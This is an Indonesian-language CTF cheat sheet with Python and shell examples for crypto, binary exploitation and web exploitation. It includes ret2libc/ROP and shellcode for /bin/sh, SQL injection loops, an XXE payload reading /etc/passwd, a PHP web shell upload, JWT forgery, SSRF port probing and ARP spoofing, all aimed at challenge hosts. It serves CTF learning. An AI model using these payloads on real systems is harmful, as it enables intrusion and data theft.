# CTF Tools Guide

## Setup Awal

```bash
# Activate environment
source ~/ctf-tools/venv/bin/activate

# atau pakai alias
ctf
```

---

## üîê CRYPTO TOOLS

### 1. PyCryptodome
**Repo**: https://github.com/Legrandin/pycryptodome  
**Fungsi**: Library crypto modern Python, pengganti PyCrypto

**Use Case CTF**:
```python
from Crypto.Util.number import *
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA

# === RSA Basics ===
# Contoh: Dapet n, e, c dari soal
n = 13290059028199219729851581195642979093584680654753155196946421412347009930442907202072342297326597414238550377494959768637418339564520861376472845924134127
e = 65537
c = 7654321987654321

# Generate private key dari p, q
p = 115792089237316195423570985008687907853269984665640564039457584007913129639747
q = 115792089237316195423570985008687907853269984665640564039457584007913129639936
phi = (p-1)*(q-1)
d = inverse(e, phi)
m = pow(c, d, n)
print(long_to_bytes(m))

# === AES Encryption/Decryption ===
# Soal: Dapet ciphertext + key dalam hex
key = bytes.fromhex('0123456789abcdef0123456789abcdef')
ct = bytes.fromhex('deadbeefcafe...')

# AES ECB
cipher = AES.new(key, AES.MODE_ECB)
plaintext = cipher.decrypt(ct)
print(plaintext)

# AES CBC (butuh IV)
iv = bytes.fromhex('00112233445566778899aabbccddeeff')
cipher = AES.new(key, AES.MODE_CBC, iv)
plaintext = cipher.decrypt(ct)
print(plaintext)

# === XOR Analysis ===
# Contoh: Known plaintext attack
plaintext = b"flag{"
ciphertext = bytes.fromhex("1a2b3c4d5e")
key = bytes([p^c for p,c in zip(plaintext, ciphertext)])
print(f"Key: {key}")
```

### 2. gmpy2
**Repo**: https://github.com/aleaxit/gmpy  
**Fungsi**: Matematika presisi tinggi, perfect untuk RSA attacks

**Use Case CTF**:
```python
import gmpy2

# === Fermat Factorization ===
# Dipakai kalau p dan q deket banget (p ‚âà q)
def fermat_factor(n):
    a = gmpy2.isqrt(n) + 1
    b2 = gmpy2.square(a) - n
    while not gmpy2.is_square(b2):
        a += 1
        b2 = gmpy2.square(a) - n
    p = a + gmpy2.isqrt(b2)
    q = a - gmpy2.isqrt(b2)
    return int(p), int(q)

n = 99400891893103483824493188361952103820923
p, q = fermat_factor(n)
print(f"p: {p}, q: {q}")

# === GCD untuk Common Modulus ===
# Soal: Dapet dua n yang punya faktor sama
n1 = 123456789...
n2 = 987654321...
p = gmpy2.gcd(n1, n2)
print(f"Common factor: {p}")

# === Nth Root ===
# Soal: e kecil banget (e=3) dan c < n
c = 1234567890
e = 3
m = gmpy2.iroot(c, e)[0]
print(long_to_bytes(int(m)))

# === Inverse Modulo ===
e = 65537
phi = (p-1)*(q-1)
d = gmpy2.invert(e, phi)
```

### 3. SymPy
**Repo**: https://github.com/sympy/sympy  
**Fungsi**: Symbolic math, bagus untuk equation solving

**Use Case CTF**:
```python
from sympy import *
from sympy.ntheory import *

# === Solve Equations ===
# Soal: System of equations
x, y = symbols('x y')
eq1 = Eq(2*x + 3*y, 10)
eq2 = Eq(x - y, 1)
solution = solve((eq1, eq2), (x, y))
print(solution)

# === Discrete Log ===
# Soal: g^x ‚â° h (mod p), cari x
p = 1000000007
g = 2
h = 123456
x = discrete_log(p, h, g)
print(f"x = {x}")

# === Prime Factorization ===
n = 123456789012345
factors = factorint(n)
print(factors)

# === Modular Arithmetic ===
result = mod_inverse(3, 11)  # 3^-1 mod 11
print(result)

# === Chinese Remainder Theorem ===
# Soal: x ‚â° a1 (mod m1), x ‚â° a2 (mod m2)
from sympy.ntheory.modular import crt
m_list = [3, 5, 7]
a_list = [2, 3, 2]
x = crt(m_list, a_list)[0]
print(f"x = {x}")
```

### 4. Z3 Solver
**Repo**: https://github.com/Z3Prover/z3  
**Fungsi**: SMT solver, powerful untuk constraint solving

**Use Case CTF**:
```python
from z3 import *

# === Simple Equation ===
# Soal: flag = "ABCD" tapi ada constraints
x = Int('x')
y = Int('y')
solver = Solver()
solver.add(x + y == 10)
solver.add(x * y == 21)
if solver.check() == sat:
    model = solver.model()
    print(f"x = {model[x]}, y = {model[y]}")

# === BitVector Operations ===
# Soal: Binary operations dengan constraints
a = BitVec('a', 32)
b = BitVec('b', 32)
solver = Solver()
solver.add(a ^ b == 0xdeadbeef)
solver.add(a + b == 0xcafebabe)
if solver.check() == sat:
    m = solver.model()
    print(f"a = {hex(m[a].as_long())}")

# === Reverse Engineering Logic ===
# Soal: Ada function yang di-obfuscate
flag = [BitVec(f'f{i}', 8) for i in range(8)]
s = Solver()

# Constraints dari binary
s.add(flag[0] + flag[1] == 150)
s.add(flag[2] ^ flag[3] == 0x42)
s.add(flag[4] * 2 == flag[5])
# ... dst

if s.check() == sat:
    m = s.model()
    result = ''.join([chr(m[f].as_long()) for f in flag])
    print(f"Flag: {result}")
```

### 5. libnum
**Repo**: https://github.com/hellman/libnum  
**Fungsi**: Number theory tools untuk CTF

**Use Case CTF**:
```python
import libnum

# === Convert Helpers ===
# String ke number
text = "hello"
num = libnum.s2n(text)
print(f"Number: {num}")

# Number ke string
recovered = libnum.n2s(num)
print(f"Text: {recovered}")

# === GCD & LCM ===
gcd = libnum.gcd(48, 18)
lcm = libnum.lcm(48, 18)

# === Modular Inverse ===
inv = libnum.invmod(3, 11)

# === Solving Linear Congruence ===
# ax ‚â° b (mod m)
# Contoh: 3x ‚â° 6 (mod 9)
x = libnum.solve_crt([6], [9], [3])

# === Generate Primes ===
prime = libnum.generate_prime(512)  # 512-bit prime
```

---

## üí£ PWN TOOLS

### 1. Pwntools
**Repo**: https://github.com/Gallopsled/pwntools  
**Fungsi**: Framework lengkap untuk binary exploitation

**Use Case CTF**:
```python
from pwn import *

# === Setup Connection ===
# Local
p = process('./binary')

# Remote
p = remote('chall.ctf.com', 1337)

# === Basic I/O ===
# Receive sampai prompt
p.recvuntil(b'Enter name: ')

# Send payload
p.sendline(b'admin')

# Receive line
data = p.recvline()

# Interactive shell
p.interactive()

# === Buffer Overflow ===
# Soal: Stack buffer overflow ke RIP
context.binary = ELF('./vuln')
rop = ROP(context.binary)

offset = 40  # Offset ke saved RIP
payload = flat([
    b'A' * offset,
    p64(0xdeadbeef),  # Overwrite RIP
])
p.sendline(payload)

# === ROP Chain ===
libc = ELF('./libc.so.6')
rop = ROP([context.binary, libc])

# Build chain: system("/bin/sh")
binsh = next(libc.search(b'/bin/sh'))
rop.call('system', [binsh])

payload = flat([
    b'A' * offset,
    rop.chain()
])
p.sendline(payload)

# === Format String ===
# Leak address dari stack
payload = b'%p.' * 20  # Leak 20 values
p.sendline(payload)
leaks = p.recvline().split(b'.')

# Write arbitrary value
# %n = write, %<num>$n = write ke arg ke-num
writes = {0x601234: 0xdeadbeef}
payload = fmtstr_payload(offset, writes)

# === Shellcode ===
# Generate shellcode
shellcode = asm(shellcraft.sh())  # x86_64 /bin/sh

# Dengan NOP sled
payload = b'\x90' * 100 + shellcode

# Custom shellcode
shellcode = asm('''
    xor rax, rax
    push rax
    mov rdi, 0x68732f6e69622f
    push rdi
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov al, 0x3b
    syscall
''')

# === Heap Exploitation ===
# tcache poisoning
def alloc(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendlineafter(b'Data: ', data)

def free(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Index: ', str(idx).encode())

# Trigger double free
alloc(0x20, b'A'*0x20)
free(0)
free(0)  # tcache poisoning

# === Utils ===
# Cyclic pattern untuk finding offset
pattern = cyclic(200)
p.sendline(pattern)
# Kalau crash, cek: cyclic_find(0x61616171)

# Packing values
packed = p64(0xdeadbeef)  # 64-bit
packed32 = p32(0xcafebabe)  # 32-bit

# Unpacking
addr = u64(p.recv(8))

# === Advanced: ret2libc ===
# Leak libc address
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main = elf.symbols['main']
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

# Stage 1: Leak
payload = flat([
    b'A' * offset,
    p64(pop_rdi),
    p64(puts_got),
    p64(puts_plt),
    p64(main)
])
p.sendline(payload)

# Get leak
leak = u64(p.recv(6).ljust(8, b'\x00'))
libc.address = leak - libc.symbols['puts']
log.info(f"Libc base: {hex(libc.address)}")

# Stage 2: system("/bin/sh")
system = libc.symbols['system']
binsh = next(libc.search(b'/bin/sh'))
payload = flat([
    b'A' * offset,
    p64(pop_rdi),
    p64(binsh),
    p64(system)
])
p.sendline(payload)
p.interactive()
```

### 2. ROPgadget
**Repo**: https://github.com/JonathanSalwan/ROPgadget  
**Fungsi**: Find ROP gadgets dalam binary

**Use Case CTF**:
```bash
# Di terminal (bukan Python)

# Find semua gadgets
ROPgadget --binary ./binary

# Find specific gadget
ROPgadget --binary ./binary --only "pop|ret"

# Find syscall
ROPgadget --binary ./binary --string "/bin/sh"

# Generate ROP chain
ROPgadget --binary ./binary --ropchain
```

Dalam Python:
```python
from pwn import *

elf = ELF('./binary')
rop = ROP(elf)

# Find gadgets
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]

log.info(f"pop rdi: {hex(pop_rdi)}")
```

### 3. Ropper
**Repo**: https://github.com/sashs/Ropper  
**Fungsi**: Alternative ROPgadget, lebih advanced

**Use Case CTF**:
```bash
# Interactive mode
ropper --file ./binary

# Search gadget
ropper --file ./binary --search "pop rdi"

# Find JOP gadgets
ropper --file ./binary --jop

# Chain generation
ropper --file ./binary --chain "execve"
```

---

## üåê WEB EXPLOITATION TOOLS

### 1. Requests
**Repo**: https://github.com/psf/requests  
**Fungsi**: HTTP library, fundamental untuk web challenges

**Use Case CTF**:
```python
import requests

# === Basic Requests ===
r = requests.get('http://chall.ctf.com/api')
print(r.text)
print(r.json())

# === POST dengan data ===
data = {'username': 'admin', 'password': 'admin'}
r = requests.post('http://chall.ctf.com/login', data=data)

# === Headers & Cookies ===
headers = {
    'User-Agent': 'CTFBot/1.0',
    'X-Custom': 'value'
}
cookies = {'session': 'abc123'}
r = requests.get('http://chall.ctf.com', headers=headers, cookies=cookies)

# === Sessions (maintain cookies) ===
s = requests.Session()
s.post('http://chall.ctf.com/login', data={'user': 'admin', 'pass': 'admin'})
r = s.get('http://chall.ctf.com/dashboard')  # Cookies otomatis

# === SQL Injection ===
# Test parameter
for i in range(1, 100):
    payload = f"' OR id={i}--"
    r = requests.get(f'http://chall.ctf.com/user?id={payload}')
    if 'flag' in r.text:
        print(f"Found at id={i}")
        print(r.text)
        break

# === Blind SQLi (Boolean-based) ===
def check(payload):
    r = requests.get(f'http://chall.ctf.com?id=1{payload}')
    return 'Welcome' in r.text

# Extract database name
db_name = ''
for i in range(1, 20):
    for c in 'abcdefghijklmnopqrstuvwxyz_':
        payload = f" AND SUBSTRING(database(),{i},1)='{c}'"
        if check(payload):
            db_name += c
            print(f"Database: {db_name}")
            break

# === Time-based SQLi ===
import time
payload = "' AND SLEEP(5)--"
start = time.time()
r = requests.get(f'http://chall.ctf.com?id=1{payload}')
if time.time() - start > 4:
    print("Vulnerable to time-based SQLi!")

# === XXE ===
xxe_payload = """<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>"""

r = requests.post('http://chall.ctf.com/api', 
                  data=xxe_payload,
                  headers={'Content-Type': 'application/xml'})
print(r.text)

# === SSRF ===
# Test internal ports
for port in [80, 8080, 3306, 6379, 27017]:
    payload = f"http://localhost:{port}"
    r = requests.get(f'http://chall.ctf.com/fetch?url={payload}')
    if r.status_code == 200:
        print(f"Port {port} open!")

# === File Upload Bypass ===
files = {
    'file': ('shell.php', '<?php system($_GET["cmd"]); ?>', 'image/jpeg')
}
r = requests.post('http://chall.ctf.com/upload', files=files)

# === Race Condition ===
import threading

def exploit():
    s = requests.Session()
    s.post('http://chall.ctf.com/buy', data={'item': 'flag'})

threads = []
for i in range(10):
    t = threading.Thread(target=exploit)
    threads.append(t)
    t.start()

for t in threads:
    t.join()
```

### 2. BeautifulSoup4
**Repo**: https://www.crummy.com/software/BeautifulSoup/  
**Fungsi**: HTML/XML parsing

**Use Case CTF**:
```python
import requests
from bs4 import BeautifulSoup

# === Parse HTML ===
r = requests.get('http://chall.ctf.com')
soup = BeautifulSoup(r.text, 'html.parser')

# Find elements
title = soup.find('title').text
links = soup.find_all('a')

# Extract hrefs
for link in links:
    print(link.get('href'))

# === Hidden Data ===
# Cari comments
comments = soup.find_all(string=lambda text: isinstance(text, Comment))
for comment in comments:
    print(comment)

# === Form Parsing ===
form = soup.find('form')
action = form.get('action')
inputs = form.find_all('input')

# Build payload
data = {}
for inp in inputs:
    name = inp.get('name')
    value = inp.get('value', '')
    data[name] = value

# === Web Scraping untuk Flag ===
# Soal: Flag tersebar di banyak pages
base_url = 'http://chall.ctf.com/page'
flag = ''

for i in range(1, 100):
    r = requests.get(f'{base_url}{i}')
    soup = BeautifulSoup(r.text, 'html.parser')
    
    # Cari pattern flag
    text = soup.get_text()
    if 'CTF{' in text:
        import re
        match = re.search(r'CTF\{[^\}]+\}', text)
        if match:
            flag += match.group()

print(f"Flag: {flag}")
```

### 3. PyJWT
**Repo**: https://github.com/jpadilla/pyjwt  
**Fungsi**: JSON Web Token manipulation

**Use Case CTF**:
```python
import jwt

# === Decode JWT (tanpa verify) ===
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
decoded = jwt.decode(token, options={"verify_signature": False})
print(decoded)

# Lihat header
header = jwt.get_unverified_header(token)
print(header)

# === None Algorithm Attack ===
# Soal: Server vulnerable ke alg=none
payload = {'user': 'admin', 'role': 'admin'}
malicious = jwt.encode(payload, '', algorithm='none')
# Remove signature part
malicious = malicious.rsplit('.', 1)[0] + '.'

# === Weak Secret Bruteforce ===
token = "eyJhbG..."
wordlist = ['secret', 'password', '123456', 'admin']

for secret in wordlist:
    try:
        decoded = jwt.decode(token, secret, algorithms=['HS256'])
        print(f"Found secret: {secret}")
        print(decoded)
        break
    except:
        continue

# === Key Confusion (RS256 -> HS256) ===
# Dapat public key dari /jwks.json atau /.well-known/jwks.json
public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
-----END PUBLIC KEY-----"""

payload = {'user': 'admin'}
# Sign dengan public key sebagai secret (HS256)
malicious = jwt.encode(payload, public_key, algorithm='HS256')

# === JWT Cracking dengan john ===
# Save token ke file
# john jwt.txt --wordlist=rockyou.txt
```

### 4. SQLParse
**Repo**: https://github.com/andialbrecht/sqlparse  
**Fungsi**: SQL parser untuk analyze queries

**Use Case CTF**:
```python
import sqlparse

# === Format SQL ===
query = "SELECT*FROM users WHERE id=1 AND name='admin'"
formatted = sqlparse.format(query, reindent=True, keyword_case='upper')
print(formatted)

# === Parse SQL Injection ===
payload = "1' OR '1'='1"
parsed = sqlparse.parse(f"SELECT * FROM users WHERE id='{payload}'")
print(parsed[0].tokens)

# === Extract Tables ===
query = "SELECT u.name, p.title FROM users u JOIN posts p ON u.id=p.user_id"
parsed = sqlparse.parse(query)[0]

for token in parsed.tokens:
    if token.ttype is None:
        # Extract identifiers
        print(token)
```

### 5. Websocket-Client
**Repo**: https://github.com/websocket-client/websocket-client  
**Fungsi**: WebSocket client untuk real-time communication

**Use Case CTF**:
```python
import websocket
import json

# === Basic Connection ===
ws = websocket.WebSocket()
ws.connect("ws://chall.ctf.com/ws")

# Send message
ws.send("Hello")

# Receive
result = ws.recv()
print(result)

# === JSON Communication ===
data = {'action': 'get_flag', 'token': 'abc123'}
ws.send(json.dumps(data))
response = json.loads(ws.recv())
print(response)

# === Long-running Connection ===
def on_message(ws, message):
    print(f"Received: {message}")
    if 'flag' in message:
        print("Found flag!")
        ws.close()

def on_error(ws, error):
    print(f"Error: {error}")

def on_close(ws, close_code, reason):
    print("Connection closed")

def on_open(ws):
    ws.send('{"action": "subscribe"}')

ws = websocket.WebSocketApp("ws://chall.ctf.com/ws",
                            on_message=on_message,
                            on_error=on_error,
                            on_close=on_close,
                            on_open=on_open)

ws.run_forever()

# === Race Condition via WebSocket ===
import threading

def spam_ws():
    ws = websocket.WebSocket()
    ws.connect("ws://chall.ctf.com/ws")
    for i in range(100):
        ws.send('{"action": "redeem_coupon"}')
    ws.close()

threads = []
for i in range(10):
    t = threading.Thread(target=spam_ws)
    threads.append(t)
    t.start()
```

---

## üîß GENERAL UTILITIES

### Scapy (Network)
```python
from scapy.all import *

# === Packet Sniffing ===
packets = sniff(count=10)
packets.summary()

# === Packet Crafting ===
packet = IP(dst="10.0.0.1")/TCP(dport=80)
send(packet)

# === ARP Spoofing ===
arp = ARP(pdst="192.168.1.1")
send(arp)
```

### Pillow (Image)
```python
from PIL import Image

# === Steganography ===
img = Image.open('challenge.png')
pixels = img.load()

# Extract LSB
data = ''
for i in range(img.width):
    for j in range(img.height):
        r, g, b = pixels[i, j]
        data += str(r & 1)  # LSB of red channel

# Convert binary to text
flag = ''.join([chr(int(data[i:i+8], 2)) for i in range(0, len(data), 8)])
print(flag)

# === QR Code Hidden ===
# Invert colors
inverted = Image.eval(img, lambda x: 255 - x)
inverted.save('inverted.png')
```

---

## üß™ SageMath - Crypto Advanced

**Website**: https://www.sagemath.org/  
**Online**: https://sagecell.sagemath.org/

**Use Case CTF** (save sebagai .sage file):
```python
# === RSA Attacks ===

# Wiener's Attack (d kecil)
def wiener_attack(e, n):
    cf = continued_fraction(e/n)
    for i in range(len(cf.convergents())):
        k_d = cf.convergents()[i]
        k = k_d.numerator()
        d = k_d.denominator()
        if k != 0:
            phi = (e*d - 1)/k
            if phi == int(phi):
                phi = int(phi)
                s = n - phi + 1
                discr = s*s - 4*n
                if discr >= 0:
                    t = sqrt(discr)
                    if t == int(t):
                        return d
    return None

e = 352579...
n = 987654...
d = wiener_attack(e, n)

# Factorization
n = 123456789
p, q = factor(n)

# === Elliptic Curves ===
# Define curve
p = 2^256 - 2^32 - 977
a = 0
b = 7
E = EllipticCurve(GF(p), [a, b])

# Points
G = E(0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798,
      0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8)

# Scalar multiplication
k = 123456
P = k * G

# Discrete log (small curve only)
Q = 99999 * G
k = discrete_log(Q, G, G.order(), operation='+')

# === Polynomial Attacks ===
# Small e, multiple messages
e = 3
n1, n2, n3 = ...  # Three different moduli
c1, c2, c3 = ...  # Same message encrypted

# CRT
x = crt([c1, c2, c3], [n1, n2, n3])
m = x.nth_root(e)

# === Lattice Attacks ===
# Coppersmith's Attack
P.<x> = PolynomialRing(Zmod(n))
f = (message_high_bits + x)^e - c
roots = f.small_roots(X=2^64, beta=0.5)

# === Discrete Log ===
p = 1000000007
g = 2
h = 123456789
x = discrete_log(mod(h, p), mod(g, p))
```

Jalankan Sage script:
```bash
# Via Docker
docker run -v $(pwd):/home/sage/work sagemath/sagemath sage /home/sage/work/solve.sage

# Atau online: paste di https://sagecell.sagemath.org/
```

---

## üìù Template CTF Solver

```python
#!/usr/bin/env python3
from pwn import *
from Crypto.Util.number import *
import requests

# Configuration
HOST = 'chall.ctf.com'
PORT = 1337
LOCAL = False

# Setup connection
if LOCAL:
    p = process('./binary')
else:
    p = remote(HOST, PORT)

context.log_level = 'debug'

# Your exploit here
p.recvuntil(b'prompt: ')
payload = b'A' * 100
p.sendline(payload)

# Get flag
p.interactive()
```
